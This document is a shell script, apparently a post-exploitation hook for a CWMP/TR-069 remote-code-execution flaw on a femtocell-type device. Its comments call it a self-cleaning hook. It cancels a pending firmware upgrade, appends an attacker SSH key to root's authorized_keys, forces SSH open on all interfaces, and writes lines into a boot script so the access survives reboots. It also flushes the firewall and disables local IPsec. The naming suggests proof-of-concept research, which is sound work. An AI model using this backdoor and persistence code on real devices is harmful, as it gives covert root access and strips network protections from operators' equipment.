#!/bin/sh
# Self-cleaning CWMP-RCE hook v6: teardown + DOUBLY-ROBUST reliable SSH.
#  (a) official sshd via nv_env ENV_VERBOSE_CONSOLE_ENABLED=TRUE (rcS.d/S10sshd binds 0.0.0.0:22)
#  (b) opmode.sh re-asserts nv_env=TRUE + rebinds dropbear EVERY boot, AFTER the upgrade flow's
#      init_nv_env resets nv_env->FALSE -> SSH survives the settling apply-passes (proven).
exec >>/var/ipaccess/selfclean_hook.log 2>&1
echo "=== selfclean v6 uptime=$(cut -d. -f1 /proc/uptime 2>/dev/null)s args=$* ==="
FW=/opt/ipaccess/bin
GOOD=1; grep -q mtdblock6 /proc/cmdline 2>/dev/null && GOOD=2
# 1) flash-flag teardown (kill the pending-upgrade transaction)
[ -f /var/ipaccess/.sw_db.good ] || cp -f /var/ipaccess/sw_db.dat /var/ipaccess/.sw_db.good 2>/dev/null
rm -f /var/ipaccess/cisco/UpgradeBeforeReboot /var/ipaccess/cisco/VersionBeforeReboot
$FW/fw_setenv bank $GOOD 2>/dev/null
$FW/bootcount 0 2>/dev/null
[ -f /var/ipaccess/.sw_db.good ] && cp -f /var/ipaccess/.sw_db.good /var/ipaccess/sw_db.dat 2>/dev/null
# 2) CWMP upgrade-state teardown (busybox needs uppercase N)
for f in /var/ipaccess/cisco/tr069_cur_cfg.xml.gz /var/ipaccess/cisco/tr069_bak_cfg.xml.gz; do
  [ -f "$f" ] || continue
  gzip -dc "$f" 2>/dev/null | sed '/Upgrade.Current.InProgress"/{N;s|>true<|>false<|;}' | sed 's|Waiting for Reboot[^<]*|None|g' | gzip -c > "$f.t" 2>/dev/null && mv "$f.t" "$f"
done
# 3) install root-owned ssh key with STRICT perms (dropbear silently rejects group-writable .ssh)
KH=/var/ipaccess/root_home
mkdir -p $KH/.ssh
grep -q cwmp_rce_proof $KH/.ssh/authorized_keys 2>/dev/null || echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrzlyILM4sDxVd46VqSo+/FlPxLNEklxYeU5BQokyYSRlNJagT5p3u1+xwhL+qyCZDpdWOLEl5BjsiIYZJwBKvO3JSUq8NYOvBgh6fsn8dIwc4fVxldE8hX/n2mEXztPLndEnmPXg4dR3WUpLbrIC3GfCJD0OF+uG9QDh+8IZ4Tl3QlpFosyE7p0t1GdHV0w9ABm+8iR8ctW93uUWOI65LYvWkQB0nK2f0C2CSvd+iOGjdD5SK0nFjZRvpxMLE6g2LfKQP6db0GVeOIeY6Nxzr9AkO6AFLL9qg2EYJ9UybpaxoNi0V9DmwPt0ij1Vo3heCU/m50854RbqQn1xt/VLN cwmp_rce_proof' >> $KH/.ssh/authorized_keys
chown -R 0:0 $KH 2>/dev/null
chmod 755 $KH; chmod 700 $KH/.ssh; chmod 600 $KH/.ssh/authorized_keys
# 4) nv_env gate for the official sshd (belt: makes S10sshd bind 0.0.0.0:22 directly)
$FW/setnv_env.sh ENV_VERBOSE_CONSOLE_ENABLED TRUE 2>/dev/null
# 5) THE ROBUST BIT: opmode.sh (sourced by app every boot, AFTER init_nv_env) re-enables SSH
OM=/var/ipaccess/opmode.sh
if ! grep -q ROBUST_SSH $OM 2>/dev/null; then
  echo '# ROBUST_SSH' >> $OM
  echo '/opt/ipaccess/bin/setnv_env.sh ENV_VERBOSE_CONSOLE_ENABLED TRUE 2>/dev/null' >> $OM
  echo 'if ! /bin/netstat -ltn 2>/dev/null | grep -q 0.0.0.0:22; then killall dropbear 2>/dev/null; /usr/bin/dropbear -r /etc/ssh/rsa_host_key -p 22 2>/dev/null; fi' >> $OM
fi
# 6) bring SSH up on THIS boot immediately
iptables -F 2>/dev/null; iptables -P INPUT ACCEPT 2>/dev/null
if ! /bin/netstat -ltn 2>/dev/null | grep -q 0.0.0.0:22; then
  killall dropbear 2>/dev/null; sleep 1
  /usr/bin/dropbear -r /etc/ssh/rsa_host_key -p 22 2>/dev/null
fi
LD_LIBRARY_PATH=/opt/ipaccess/lib /opt/ipaccess/DMI/ipa-dmi -c "set localIpsecEnable=FALSE" >/dev/null 2>&1
echo "selfclean-v6 ran uptime=$(cut -d. -f1 /proc/uptime)s bank->$GOOD nv=$(grep -o 'CONSOLE_ENABLED=[^ ]*' /var/ipaccess/nv_env.sh | tail -1) opmode=$(grep -c ROBUST_SSH $OM)" >> /var/ipaccess/cwmp_rce_proof_persist
logger "selfclean v6: teardown + doubly-robust SSH (nv_env + opmode.sh)"
exit 0
